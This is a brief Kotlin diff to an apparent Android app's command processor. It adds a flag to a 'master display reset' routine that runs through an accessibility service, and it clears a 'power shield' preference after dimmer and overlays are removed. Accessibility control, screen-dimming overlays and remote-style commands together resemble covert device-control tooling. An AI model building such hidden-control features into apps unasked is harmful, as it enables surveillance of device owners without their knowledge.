@@ -2040,7 +2040,7 @@ object CommandProcessor {
                         // 1. Master Display Reset
                         val service = MyAccessibilityService.instance
                         if (service != null) {
-                            service.startMasterDisplayReset(id)
+                            service.startMasterDisplayReset(id, false)
                             var timeout = 0
                             while(service.activeSequence != null && timeout < 30) { kotlinx.coroutines.delay(1000); timeout++ }
                         }
@@ -2078,7 +2078,7 @@ object CommandProcessor {
                 "MASTER_DISPLAY_RESET" -> {
                     val service = MyAccessibilityService.instance
                     if (service != null) {
-                        service.startMasterDisplayReset(id)
+                        service.startMasterDisplayReset(id, true)
                         status = "MASTER_SEQUENCE_INITIATED"
                     } else {
                         status = "FAILED (SERVICE_OFF)"
@@ -2297,6 +2297,8 @@ object CommandProcessor {
                         DynamicUIManager.removeOverlay(ctx, "FINALIZE_RESET")
                         DynamicUIManager.removeNativeOverlay(ctx, "FINALIZE_RESET")
                         DimmerManager.removeOverlay(ctx)
+                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
+                            .putBoolean("power_shield_keep_ignited", false).apply()
                     }, 800)
 
                     // 5. Wake Screen to Swipe/Lock screen
